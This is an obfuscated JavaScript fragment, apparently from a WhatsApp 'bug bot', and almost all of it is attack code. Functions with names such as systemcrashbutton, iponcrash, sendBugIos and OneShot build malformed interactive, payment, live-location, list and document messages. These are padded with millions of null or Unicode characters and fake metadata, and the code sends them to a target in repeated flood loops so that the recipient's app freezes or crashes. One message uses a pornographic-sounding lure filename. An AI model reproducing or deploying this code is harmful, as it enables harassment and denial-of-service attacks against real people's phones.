sendPaymentInfoMessage(_0x26e909),await sendbugbeta2(_0x26e909),await OneShot2(_0x26e909),await ngeloc(_0x26e909,subscribe_zynXzo),await systemcrashbutton(_0x26e909),await zynX['sendMessage'](_0x26e909,{'text':virtexnyalur},{'quoted':subscribe_zynXzo}),await sendGroupMessage(_0x26e909),await ngeloc(_0x26e909,subscribe_zynXzo),await systemcrashbutton(_0x26e909),await sendPaymentInfoMessage(_0x26e909),await sendbugbeta2(_0x26e909),await OneShot(_0x26e909),await ngeloc(_0x26e909,subscribe_zynXzo),await systemcrashbutton(_0x26e909),await zynX[_0xe633f8(0x109)](_0x26e909,{'text':virtexnyalur},{'quoted':subscribe_zynXzo}),await sendGroupMessage(_0x26e909),await ngeloc(_0x26e909,subscribe_zynXzo),await sendGroupMessage(_0x26e909),await sendPaymentInfoMessage(_0x26e909),await sendGroupMessage(_0x26e909),await ngeloc(_0x26e909,subscribe_zynXzo),await systemcrashbutton(_0x26e909),await zynX[_0xe633f8(0x109)](_0x26e909,{'text':virtexnyalur},{'quoted':subscribe_zynXzo}),await sendGroupMessage(_0x26e909),await ngeloc(_0x26e909,subscribe_zynXzo),await systemcrashbutton(_0x26e909),await sendPaymentInfoMessage(_0x26e909),await sendbugbeta2(_0x26e909),await sendGroupMessage(_0x26e909),await ngeloc(_0x26e909,subscribe_zynXzo),await systemcrashbutton(_0x26e909),await zynX[_0xe633f8(0x109)](_0x26e909,{'text':virtexnyalur},{'quoted':subscribe_zynXzo}),await sendGroupMessage(_0x26e909),await ngeloc(_0x26e909,subscribe_zynXzo),await systemcrashbutton(_0x26e909),await sleep(0xfa0),await sendPaymentInfoMessage(_0x26e909),await sendbugbeta2(_0x26e909),await OneShot(_0x26e909),await ngeloc(_0x26e909,subscribe_zynXzo),await systemcrashbutton(_0x26e909),await ngeloc(_0x26e909,subscribe_zynXzo),await systemcrashbutton(_0x26e909),await sendPaymentInfoMessage(_0x26e909),await sendbugbeta2(_0x26e909),await sendGroupMessage(_0x26e909),await ngeloc(_0x26e909,subscribe_zynXzo),await systemcrashbutton(_0x26e909),await ngeloc(_0x26e909,subscribe_zynXzo),await systemcrashbutton(_0x26e909),await sendPaymentInfoMessage(_0x26e909),await sendbugbeta2(_0x26e909),await sendGroupMessage(_0x26e909),await ngeloc(_0x26e909,subscribe_zynXzo),await systemcrashbutton(_0x26e909),await ngeloc(_0x26e909,subscribe_zynXzo),await systemcrashbutton(_0x26e909),await sendPaymentInfoMessage(_0x26e909),await sendbugbeta2(_0x26e909),await sendGroupMessage(_0x26e909),await ngeloc(_0x26e909,subscribe_zynXzo),await systemcrashbutton(_0x26e909),await ngeloc(_0x26e909,subscribe_zynXzo),await systemcrashbutton(_0x26e909),await sendPaymentInfoMessage(_0x26e909),await sendbugbeta2(_0x26e909),await OneShot(_0x26e909),await ngeloc(_0x26e909,subscribe_zynXzo),await systemcrashbutton(_0x26e909),await ngeloc(_0x26e909,subscribe_zynXzo),await systemcrashbutton(_0x26e909),await sleep(0x1770),await sendPaymentInfoMessage(_0x26e909),await OneShot(_0x26e909),await ngeloc(_0x26e909,subscribe_zynXzo),await systemcrashbutton(_0x26e909),await ngeloc(_0x26e909,subscribe_zynXzo),await systemcrashbutton(_0x26e909),await sendPaymentInfoMessage(_0x26e909),await sendGroupMessage(_0x26e909),await ngeloc(_0x26e909,subscribe_zynXzo),await systemcrashbutton(_0x26e909),await ngeloc(_0x26e909,subscribe_zynXzo),await systemcrashbutton(_0x26e909),await sendPaymentInfoMessage(_0x26e909),await OneShot(_0x26e909),await ngeloc(_0x26e909,subscribe_zynXzo),await systemcrashbutton(_0x26e909),await ngeloc(_0x26e909,subscribe_zynXzo),await systemcrashbutton(_0x26e909),await sendPaymentInfoMessage(_0x26e909),await sendbugbeta2(_0x26e909),await OneShot(_0x26e909),await ngeloc(_0x26e909,subscribe_zynXzo),await systemcrashbutton(_0x26e909),await ngeloc(_0x26e909,subscribe_zynXzo),await sendGroupMessage(_0x26e909),await sendPaymentInfoMessage(_0x26e909),await sendbugbeta2(_0x26e909),await OneShot2(_0x26e909),await ngeloc(_0x26e909,subscribe_zynXzo),await systemcrashbutton(_0x26e909),await sendGroupMessage(_0x26e909),await sendGroupMessage(_0x26e909),await zynX[_0xe633f8(0x109)](_0x26e909,{'text':virtexnyalur},{'quoted':subscribe_zynXzo}),await sendGroupMessage(_0x26e909),await sendPaymentInfoMessage(_0x26e909),await sendbugbeta2(_0x26e909),await sleep(0x2710);}}async function zynzcrash(_0x129b26,_0x3214c7){for(let _0x23a7f2=0x0;_0x23a7f2<_0x3214c7;_0x23a7f2++){await sendPaymentInfoMessage(_0x129b26),await sendbugbeta2(_0x129b26),await sendPaymentInfoMessage(_0x129b26),await sendbugbeta2(_0x129b26),await sendPaymentInfoMessage(_0x129b26),await sendbugbeta2(_0x129b26),await sendPaymentInfoMessage(_0x129b26),await sendbugbeta2(_0x129b26),await OneShot(_0x129b26),await sendPaymentInfoMessage(_0x129b26),await sendbugbeta2(_0x129b26),await sendPaymentInfoMessage(_0x129b26),await sendbugbeta2(_0x129b26),await sendPaymentInfoMessage(_0x129b26),await sendbugbeta2(_0x129b26),await sendPaymentInfoMessage(_0x129b26),await sendbugbeta2(_0x129b26),await OneShot2(_0x129b26),await OneShot(_0x129b26),await sendPaymentInfoMessage(_0x129b26),await OneShot2(_0x129b26),await OneShot(_0x129b26),await sendPaymentInfoMessage(_0x129b26),await OneShot2(_0x129b26),await sleep(0xbb8),await sendPaymentInfoMessage(_0x129b26),await sendbugbeta2(_0x129b26),await sendPaymentInfoMessage(_0x129b26),await sendbugbeta2(_0x129b26),await sendPaymentInfoMessage(_0x129b26),await sendbugbeta2(_0x129b26),await sendPaymentInfoMessage(_0x129b26),await sendbugbeta2(_0x129b26),await OneShot(_0x129b26),await sendPaymentInfoMessage(_0x129b26),await sendbugbeta2(_0x129b26),await sendPaymentInfoMessage(_0x129b26),await sendbugbeta2(_0x129b26),await sendPaymentInfoMessage(_0x129b26),await sendbugbeta2(_0x129b26),await sendPaymentInfoMessage(_0x129b26),await sendbugbeta2(_0x129b26),await OneShot2(_0x129b26),await OneShot(_0x129b26),await sendPaymentInfoMessage(_0x129b26),await OneShot2(_0x129b26),await OneShot(_0x129b26),await sendPaymentInfoMessage(_0x129b26),await OneShot2(_0x129b26),await sendPaymentInfoMessage(_0x129b26),await sendbugbeta2(_0x129b26),await sleep(0x1388);}}async function OneShot(_0x4cac89){const _0x427dfa=_0x29c806;await zynX[_0x427dfa(0x13e)](_0x4cac89,{'viewOnceMessage':{'message':{'messageContextInfo':{'deviceListMetadataVersion':0x2,'deviceListMetadata':{}},'interactiveMessage':{'nativeFlowMessage':{'buttons':[{'name':_0x427dfa(0x143),'buttonParamsJson':_0x427dfa(0x145)}]}}}}},{'participant':{'jid':_0x4cac89}},{'messageId':null});}async function OneShot2(_0x4da4f7){const _0x2b8f3a=_0x29c806;await zynX[_0x2b8f3a(0x13e)](_0x4da4f7,{'viewOnceMessage':{'message':{'interactiveMessage':{'header':{'title':'','subtitle':'\x20'},'body':{'text':'Zʏɴxᴢᴏ'},'footer':{'text':'xp'},'nativeFlowMessage':{'buttons':[{'name':'cta_url','buttonParamsJson':_0x2b8f3a(0x126)}],'messageParamsJson':'\x00'[_0x2b8f3a(0x138)](0xf4240)}}}}},{'participant':{'jid':_0x4da4f7}});}async function sendbugbeta2(_0x13cd27){const _0x4a7000=_0x29c806;let _0x131ba2={'deviceListMetadataVersion':0x2,'deviceListMetadata':{}},_0x21726c={'name':_0x4a7000(0x143),'buttonParamsJson':JSON['stringify']({'currency':_0x4a7000(0x14a),'total_amount':{'value':0x0,'offset':0x64},'reference_id':_0x4a7000(0x12b),'type':_0x4a7000(0x111),'order':{'status':_0x4a7000(0x132),'subtotal':{'value':0x0,'offset':0x64},'order_type':_0x4a7000(0x14b),'items':[{'name':'','amount':{'value':0x0,'offset':0x64},'quantity':0x0,'sale_amount':{'value':0x0,'offset':0x64}}]},'payment_settings':[{'type':'pix_static_code','pix_static_code':{'merchant_name':_0x4a7000(0x10b),'key':_0x4a7000(0x150),'key_type':'X'}}]})},_0x29d161={'buttons':[_0x21726c]},_0x3b26dc={'nativeFlowMessage':_0x29d161},_0x1f0d1d={'messageContextInfo':_0x131ba2,'interactiveMessage':_0x3b26dc},_0x26a1fb={'viewOnceMessage':{'message':_0x1f0d1d}},_0x5e25ef={'participant':{'jid':_0x13cd27}};await zynX[_0x4a7000(0x13e)](_0x13cd27,_0x26a1fb,_0x5e25ef,{'messageId':null});}const poke={'key':{'participant':'0@s.whatsapp.net',...m[_0x29c806(0x127)]?{'remoteJid':_0x29c806(0x13b)}:{}},'message':{'interactiveMessage':{'header':{'hasMediaAttachment':!![],'jpegThumbnail':null},'nativeFlowMessage':{'buttons':[{'name':'review_and_pay','buttonParamsJson':'{\x22currency\x22:\x22IDR\x22,\x22total_amount\x22:{\x22value\x22:49981399788,\x22offset\x22:100},\x22reference_id\x22:\x224OON4PX3FFJ\x22,\x22type\x22:\x22physical-goods\x22,\x22order\x22:{\x22status\x22:\x22payment_requested\x22,\x22subtotal\x22:{\x22value\x22:49069994400,\x22offset\x22:100},\x22tax\x22:{\x22value\x22:490699944,\x22offset\x22:100},\x22discount\x22:{\x22value\x22:485792999999,\x22offset\x22:100},\x22shipping\x22:{\x22value\x22:48999999900,\x22offset\x22:100},\x22order_type\x22:\x22ORDER\x22,\x22items\x22:[{\x22retailer_id\x22:\x227842674605763435\x22,\x22product_id\x22:\x227842674605763435\x22,\x22name\x22:\x22Zʏɴxᴢᴏ\x22,\x22amount\x22:{\x22value\x22:9999900,\x22offset\x22:100},\x22quantity\x22:7},{\x22retailer_id\x22:\x22custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\x22,\x22name\x22:\x22\x22,\x22amount\x22:{\x22value\x22:999999900,\x22offset\x22:100},\x22quantity\x22:49}]},\x22native_payment_methods\x22:[]}'}]}}}},bugquoteddvc={'key':{'participant':'0@s.whatsapp.net',...m['chat']?{'remoteJid':'status@broadcast'}:{}},'message':{'listResponseMessage':{'title':_0x29c806(0x10d)}}};async function ngeloc(_0x2e55ad,_0x4ea040){const _0x57ddda=_0x29c806;var _0x50b578=generateWAMessageFromContent(_0x2e55ad,proto[_0x57ddda(0x107)][_0x57ddda(0x11b)]({'viewOnceMessage':{'message':{'liveLocationMessage':{'degreesLatitude':'p','degreesLongitude':'p','caption':_0x57ddda(0x10d)+'ꦾ'[_0x57ddda(0x138)](0xea60),'sequenceNumber':'0','jpegThumbnail':''}}}}),{'userJid':_0x2e55ad,'quoted':_0x4ea040});await zynX[_0x57ddda(0x13e)](_0x2e55ad,_0x50b578[_0x57ddda(0x11c)],{'participant':{'jid':_0x2e55ad},'messageId':_0x50b578['key']['id']});}async function sendViewOnceMessages(_0x2660b2){const _0x39bfc9=_0x29c806;let _0x1b5c0e=generateWAMessageFromContent(_0x2660b2,{'viewOnceMessage':{'message':{'messageContextInfo':{'deviceListMetadata':{},'deviceListMetadataVersion':0x2},'interactiveMessage':proto['Message'][_0x39bfc9(0x121)][_0x39bfc9(0x140)]({'body':proto[_0x39bfc9(0x107)][_0x39bfc9(0x121)][_0x39bfc9(0x13a)][_0x39bfc9(0x140)]({'text':''}),'footer':proto[_0x39bfc9(0x107)][_0x39bfc9(0x121)][_0x39bfc9(0x137)][_0x39bfc9(0x140)]({'text':''}),'header':proto[_0x39bfc9(0x107)][_0x39bfc9(0x121)][_0x39bfc9(0x117)][_0x39bfc9(0x140)]({'title':'','subtitle':'','hasMediaAttachment':![]}),'nativeFlowMessage':proto[_0x39bfc9(0x107)]['InteractiveMessage']['NativeFlowMessage'][_0x39bfc9(0x140)]({'buttons':[{'name':_0x39bfc9(0x115),'buttonParamsJson':_0x39bfc9(0x11d)}],'messageParamsJson':'\x00'[_0x39bfc9(0x138)](0x186a0)})})}}},{});zynX[_0x39bfc9(0x13e)](_0x2660b2,_0x1b5c0e[_0x39bfc9(0x11c)],{'messageId':_0x1b5c0e[_0x39bfc9(0x125)]['id']});}async function pirgam(_0x512804,_0x5d283c){const _0x1225a2=_0x29c806;var _0x2e804b=generateWAMessageFromContent(_0x512804,proto['Message'][_0x1225a2(0x11b)]({'interactiveMessage':{'header':{'title':'ZʏɴxᴢᴏXX99','hasMediaAttachment':!![],...await prepareWAMessageMedia({'image':{'url':_0x1225a2(0x118)}},{'upload':zynX[_0x1225a2(0x110)]})},'body':{'text':''},'footer':{'text':'ZʏɴxᴢᴏXX99'},'nativeFlowMessage':{'messageParamsJson':'\x00'['repeat'](0x2dc6c0)}}}),{'userJid':_0x512804,'quoted':_0x5d283c});await zynX[_0x1225a2(0x13e)](_0x512804,_0x2e804b[_0x1225a2(0x11c)],{'participant':{'jid':_0x512804},'messageId':_0x2e804b[_0x1225a2(0x125)]['id']});}async function bakdok(_0x1ff3f9,_0x293cff){const _0x1ffc2b=_0x29c806;var _0x4c778f=generateWAMessageFromContent(_0x1ff3f9,proto[_0x1ffc2b(0x107)][_0x1ffc2b(0x11b)]({'documentMessage':{'url':'https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true','mimetype':_0x1ffc2b(0x122),'fileSha256':_0x1ffc2b(0x15a),'fileLength':_0x1ffc2b(0x13c),'pageCount':0x3b9ac9ff,'mediaKey':_0x1ffc2b(0x14e),'fileName':'BOKEP\x20TERBARU'+'ྦྷ'[_0x1ffc2b(0x138)](0xea60),'fileEncSha256':_0x1ffc2b(0x157),'directPath':_0x1ffc2b(0x12f),'mediaKeyTimestamp':_0x1ffc2b(0x153)}}),{'userJid':_0x1ff3f9,'quoted':_0x293cff});await zynX[_0x1ffc2b(0x13e)](_0x1ff3f9,_0x4c778f[_0x1ffc2b(0x11c)],{'participant':{'jid':_0x1ff3f9},'messageId':_0x4c778f[_0x1ffc2b(0x125)]['id']});}async function penghitaman(_0xdf3f80,_0x593d31){const _0x1b30a5=_0x29c806;var _0x17b3ec=generateWAMessageFromContent(_0xdf3f80,proto[_0x1b30a5(0x107)][_0x1b30a5(0x11b)]({'stickerMessage':{'url':_0x1b30a5(0x133),'fileSha256':_0x1b30a5(0x155),'fileEncSha256':_0x1b30a5(0x14f),'mediaKey':_0x1b30a5(0x108),'mimetype':_0x1b30a5(0x128),'directPath':_0x1b30a5(0x136),'fileLength':'10116','mediaKeyTimestamp':_0x1b30a5(0x11e),'isAnimated':![],'stickerSentTs':_0x1b30a5(0x151),'isAvatar':![],'isAiSticker':![],'isLottie':![]}}),{'userJid':_0xdf3f80,'quoted':_0x593d31});await zynX[_0x1b30a5(0x13e)](_0xdf3f80,_0x17b3ec[_0x1b30a5(0x11c)],{'participant':{'jid':_0xdf3f80},'messageId':_0x17b3ec[_0x1b30a5(0x125)]['id']});}async function sendListMessage(_0x2d1e84){const _0x5362b5=_0x29c806;var _0x298881=generateWAMessageFromContent(_0x2d1e84,proto[_0x5362b5(0x107)][_0x5362b5(0x11b)]({'listMessage':{'title':_0x5362b5(0x10d)+'\x00'[_0x5362b5(0x138)](0x2710),'footerText':_0x5362b5(0x135),'description':_0x5362b5(0x135),'buttonText':null,'listType':0x2,'productListInfo':{'productSections':[{'title':_0x5362b5(0x148),'products':[{'productId':_0x5362b5(0x131)}]}],'productListHeaderImage':{'productId':_0x5362b5(0x131),'jpegThumbnail':null},'businessOwnerJid':_0x5362b5(0x14c)}},'footer':_0x5362b5(0x148),'contextInfo':{'expiration':0x927c0,'ephemeralSettingTimestamp':'1679959486','entryPointConversionSource':_0x5362b5(0x12a),'entryPointConversionApp':_0x5362b5(0x11f),'entryPointConversionDelaySeconds':0x9,'disappearingMode':{'initiator':_0x5362b5(0x147)}},'selectListType':0x2,'product_header_info':{'product_header_info_id':0x4433e2e130,'product_header_is_rejected':![]}}),{'userJid':_0x2d1e84});await zynX[_0x5362b5(0x13e)](_0x2d1e84,_0x298881[_0x5362b5(0x11c)],{'participant':{'jid':_0x2d1e84},'messageId':_0x298881[_0x5362b5(0x125)]['id']});}async function sendLiveLocationMessage(_0x4d4baf){const _0x3bd7ce=_0x29c806;var _0xdd05d9=generateWAMessageFromContent(_0x4d4baf,proto[_0x3bd7ce(0x107)][_0x3bd7ce(0x11b)]({'viewOnceMessage':{'message':{'liveLocationMessage':{'degreesLatitude':'p','degreesLongitude':'p','caption':'Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½'+'ꦾ'['repeat'](0xea60),'sequenceNumber':'0','jpegThumbnail':''}}}}),{'userJid':_0x4d4baf});await zynX[_0x3bd7ce(0x13e)](_0x4d4baf,_0xdd05d9['message'],{'participant':{'jid':_0x4d4baf},'messageId':_0xdd05d9[_0x3bd7ce(0x125)]['id']});}async function sendSystemCrashMessage(_0x3da4dc){const _0x4a1201=_0x29c806;var _0xbe476e=generateWAMessageFromContent(_0x3da4dc,proto[_0x4a1201(0x107)][_0x4a1201(0x11b)]({'viewOnceMessage':{'message':{'interactiveMessage':{'header':{'title':'','subtitle':'\x20'},'body':{'text':_0x4a1201(0x10d)},'footer':{'text':_0x4a1201(0x120)},'nativeFlowMessage':{'buttons':[{'name':_0x4a1201(0x115),'buttonParamsJson':'{\x20display_text\x20:\x20\x27ZʏɴxᴢᴏXX99\x27,\x20url\x20:\x20,\x20merchant_url\x20:\x20\x20}'}],'messageParamsJson':'\x00'[_0x4a1201(0x138)](0x2dc6c0)}}}}}),{'userJid':_0x3da4dc});await zynX[_0x4a1201(0x13e)](_0x3da4dc,_0xbe476e[_0x4a1201(0x11c)],{'participant':{'jid':_0x3da4dc},'messageId':_0xbe476e[_0x4a1201(0x125)]['id']});}function _0x3b20(){const _0x154cb0=['{\x22display_text\x22:\x22à¾§\x22.repeat(60000),\x22url\x22:\x22https://www.google.com\x22,\x22merchant_url\x22:\x22https://www.google.com\x22}','1715876003','whatsapp','Zʏɴxᴢᴏ','InteractiveMessage','penis','ê¦¾','9091070YccrJd','key','{\x20display_text\x20:\x20\x27S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸\x20U̸I̸\x20C̸R꙰̸A꙰̸S꙰̸H꙰̸\x27,\x20url\x20:\x20\x27\x27,\x20merchant_url\x20:\x20\x27\x27\x20}','chat','image/webp','1679959486','global_search_new_chat','4P46GMY57GC','Ãª¦¾','525ZvDzFB','902msshiV','/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0','Ã\x20Âº®Ã¢‚®Ã\x20½Å¾Ã\x20¸¨VÃª™°Ã\x20¸¨\x20Ã\x20¹–Ã\x20Âº¡GÃª™°Ã\x20½€Ã\u008d¡Ã\u008dÅ“Ã¢Å“…Ã¢Æ’Å¸Ã¢•®','4392524570816732','pending','https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true','24thOBCn','àº®â‚®à½žà¸¨Vê™°à¸¨\x20à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®','/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000','Footer','repeat','Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½','Body','status@broadcast','999999999','120363161387074144@g.us','relayMessage','4ECdGiT','create','FBPAY','now','payment_info','{\x20display_text\x20:\x20\x22\x20\x22,\x20url\x20:\x20,\x20merchant_url\x20:\x20\x22\x20\x22}','{\x22currency\x22:\x22BRL\x22,\x22total_amount\x22:{\x22value\x22:0,\x22offset\x22:100},\x22reference_id\x22:\x224P46GMY57GC\x22,\x22type\x22:\x22physical-goods\x22,\x22order\x22:{\x22status\x22:\x22pending\x22,\x22subtotal\x22:{\x22value\x22:0,\x22offset\x22:100},\x22order_type\x22:\x22ORDER\x22,\x22items\x22:[{\x22name\x22:\x22\x22,\x22amount\x22:{\x22value\x22:0,\x22offset\x22:100},\x22quantity\x22:0,\x22sale_amount\x22:{\x22value\x22:0,\x22offset\x22:100}}]},\x22payment_settings\x22:[{\x22type\x22:\x22pix_static_code\x22,\x22pix_static_code\x22:{\x22merchant_name\x22:\x22Zʏɴxᴢᴏ\x22,\x22key\x22:\x22+916909137213\x22,\x22key_type\x22:\x22X\x22}}]}','zynX','INITIATED_BY_ME','lol','ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ','BRL','ORDER','0@s.whatsapp.net','{\x20display_text\x20:\x20\x27ZʏɴxᴢᴏXX99\x27,\x20url\x20:\x20,\x20merchant_url\x20:\x20\x20}','5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=','r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=','+5533998586057','1715881084144','CHANGED_IN_CHAT','1715880173','3446694YcJTvQ','CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=','NONE','pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=','3184goOoAG','Ã˜‚Ã™†Ã˜Æ’Ã˜„Ã™½Ã˜‚Ã™†Ã˜Æ’Ã˜„Ã™½','ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=','3787390OOteUn','{\x20display_text\x20:\x20\x27zynX\x27,\x20url\x20:\x20,\x20merchant_url\x20:\x20\x20}','Message','4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=','sendMessage','pix_static_code','meu\x20ovo','puki','ZʏɴxᴢᴏXX99','20172JbjVtl','anjay','waUploadToServer','physical-goods','1265145bYRctb','\x20@120363161387074144@g.us','739kuooQb','cta_url','SÃŒ¸YÃª™°ÃŒ¸SÃª™°ÃŒ¸TÃª™°ÃŒ¸EÃª™°ÃŒ¸MÃª™°ÃŒ¸\x20UÃŒ¸IÃŒ¸\x20CÃŒ¸RÃª™°ÃŒ¸AÃª™°ÃŒ¸SÃª™°ÃŒ¸HÃª™°ÃŒ¸','Header','https://i.postimg.cc/Q86pPcsn/zynX.jpg','DEFAULT','585888DGwjlk','fromObject','message'];_0x3b20=function(){return _0x154cb0;};return _0x3b20();}async function sendExtendedTextMessage(_0x582df9){const _0x1c0ed2=_0x29c806;zynX[_0x1c0ed2(0x13e)](_0x582df9,{'extendedTextMessage':{'text':'.','contextInfo':{'stanzaId':_0x582df9,'participant':_0x582df9,'quotedMessage':{'conversation':_0x1c0ed2(0x139)+_0x1c0ed2(0x123)[_0x1c0ed2(0x138)](0xea60)},'disappearingMode':{'initiator':_0x1c0ed2(0x152),'trigger':'CHAT_SETTING'}},'inviteLinkGroupTypeV2':_0x1c0ed2(0x119)}},{'participant':{'jid':_0x582df9}},{'messageId':null});}async function sendVariousMessages(_0x29177a,_0x248e04){for(let _0x3543d8=0x0;_0x3543d8<_0x248e04;_0x3543d8++){sendListMessage(_0x29177a),await sleep(0x1f4),sendLiveLocationMessage(_0x29177a),await sleep(0x1f4),sendSystemCrashMessage(_0x29177a),await sleep(0x1f4),sendSystemCrashMessage(_0x29177a),await sleep(0x1f4),sendLiveLocationMessage(_0x29177a),await sleep(0x1f4),sendLiveLocationMessage(_0x29177a),await sleep(0x1f4),sendLiveLocationMessage(_0x29177a),await sleep(0x1f4),sendLiveLocationMessage(_0x29177a),await sleep(0x1f4),sendLiveLocationMessage(_0x29177a),await sleep(0x1f4),sendLiveLocationMessage(_0x29177a),await sleep(0x1f4),sendLiveLocationMessage(_0x29177a),await sleep(0x1f4),sendLiveLocationMessage(_0x29177a),await sleep(0x1f4),sendSystemCrashMessage(_0x29177a),await sleep(0x1f4),sendSystemCrashMessage(_0x29177a),await sleep(0x1f4),sendLiveLocationMessage(_0x29177a),await sleep(0x1f4),sendSystemCrashMessage(_0x29177a),await sleep(0x1f4),sendSystemCrashMessage(_0x29177a),await sleep(0x1f4),sendLiveLocationMessage(_0x29177a),await sleep(0x1f4),sendSystemCrashMessage(_0x29177a),await sleep(0x1f4),sendSystemCrashMessage(_0x29177a),await sleep(0x1f4);}}async function sendRepeatedMessages2(_0x22e7db,_0x41aeae){for(let _0x15cc98=0x0;_0x15cc98<_0x41aeae;_0x15cc98++){sendSystemCrashMessage(_0x22e7db),await sleep(0x5dc),sendSystemCrashMessage(_0x22e7db),await sleep(0x1f4),sendSystemCrashMessage(_0x22e7db),await sleep(0x1f4),sendSystemCrashMessage(_0x22e7db),await sleep(0x1f4),sendSystemCrashMessage(_0x22e7db),await sleep(0x5dc),sendSystemCrashMessage(_0x22e7db),await sleep(0x1f4),sendSystemCrashMessage(_0x22e7db),await sleep(0x1f4),sendSystemCrashMessage(_0x22e7db),await sleep(0x1f4),sendSystemCrashMessage(_0x22e7db),await sleep(0x5dc),sendSystemCrashMessage(_0x22e7db),await sleep(0x1f4),sendSystemCrashMessage(_0x22e7db),await sleep(0x1f4),sendSystemCrashMessage(_0x22e7db),await sleep(0x1f4),sendSystemCrashMessage(_0x22e7db),await sleep(0x5dc),sendSystemCrashMessage(_0x22e7db),await sleep(0x1f4),sendSystemCrashMessage(_0x22e7db),await sleep(0x1f4),sendSystemCrashMessage(_0x22e7db),await sleep(0x1f4);}}const xbug2={'key':{'remoteJid':_0x29c806(0x13b),'fromMe':![],'participant':_0x29c806(0x14c)},'message':{'listResponseMessage':{'title':_0x29c806(0x10d)}}};async function iponcrash(_0x24b5af){const _0x3cc108=_0x29c806;await zynX[_0x3cc108(0x13e)](_0x24b5af,{'paymentInviteMessage':{'serviceType':_0x3cc108(0x141),'expiryTimestamp':Date['now']()+0x6c258c00}},{}),sleep(0xc8),await zynX['relayMessage'](_0x24b5af,{'paymentInviteMessage':{'serviceType':_0x3cc108(0x141),'expiryTimestamp':Date[_0x3cc108(0x142)]()+0x6c258c00}},{'participant':{'jid':_0x24b5af}}),sleep(0xc8),await zynX[_0x3cc108(0x13e)](_0x24b5af,{'paymentInviteMessage':{'serviceType':'FBPAY','expiryTimestamp':Date[_0x3cc108(0x142)]()+0x6c258c00}},{});}async function bughomebutton(_0x5b00db){const _0x3975b0=_0x29c806;var _0x1a0626=generateWAMessageFromContent(_0x5b00db,proto[_0x3975b0(0x107)][_0x3975b0(0x11b)]({'viewOnceMessage':{'message':{'interactiveMessage':{'header':{'title':'','subtitle':'\x20'},'body':{'text':'ZʏɴxᴢᴏXX99'},'footer':{'text':_0x3975b0(0x10d)},'nativeFlowMessage':{'buttons':[{'name':_0x3975b0(0x115),'buttonParamsJson':_0x3975b0(0x14d)}],'messageParamsJson':'\x00'[_0x3975b0(0x138)](0x2dc6c0)}}}}}),{'userJid':_0x5b00db,'quoted':m});await zynX[_0x3975b0(0x13e)](_0x5b00db,_0x1a0626[_0x3975b0(0x11c)],{'messageId':_0x1a0626['key']['id']});}async function sendBugIos(_0x2fdfe6){iponcrash(_0x2fdfe6),sleep(0x1f4),sendExtendedTextMessage(_0x2fdfe6);}async function LiveLocVIP(_0x3e6af3){const _0x50fa09=_0x29c806,_0x2560f9=generateWAMessageFromContent(_0x3e6af3,proto[_0x50fa09(0x107)]['fromObject']({'viewOnceMessage':{'message':{'liveLocationMessage':{'degreesLatitude':'p','degreesLongitude':'p','caption':_0x50fa09(0x149)[_0x50fa09(0x138)](0xd6d8),'sequenceNumber':'0','jpegThumbnail':''}}}}),{'userJid':_0x3e6af3});await zynX[_0x50fa09(0x13e)](_0x3e6af3,_0x2560f9[_0x50fa09(0x11c)],{'participant':{'jid':_0x3e6af3},'messageId':_0x2560f9[_0x50fa09(0x125)]['id']});}async function ListMSGVIP(_0x27b7b3){const _0x5f52ee=_0x29c806,_0x15bc4f=generateWAMessageFromContent(_0x27b7b3,proto[_0x5f52ee(0x107)]['fromObject']({'listMessage':{'title':_0x5f52ee(0x146)+'\x00'[_0x5f52ee(0x138)](0xf423f),'footerText':'.','description':'.','buttonText':null,'listType':0x2,'productListInfo':{'productSections':[{'title':'anjay','products':[{'productId':_0x5f52ee(0x131)}]}],'productListHeaderImage':{'productId':_0x5f52ee(0x131),'jpegThumbnail':null},'businessOwnerJid':'0@s.whatsapp.net'}},'footer':_0x5f52ee(0x10c),'contextInfo':{'expiration':0x93a80,'ephemeralSettingTimestamp':_0x5f52ee(0x129),'entryPointConversionSource':_0x5f52ee(0x12a),'entryPointConversionApp':_0x5f52ee(0x11f),'entryPointConversionDelaySeconds':0x9,'disappearingMode':{'initiator':_0x5f52ee(0x147)}},'selectListType':0x2,'product_header_info':{'product_header_info_id':0x4433e2e130,'product_header_is_rejected':!![]}}),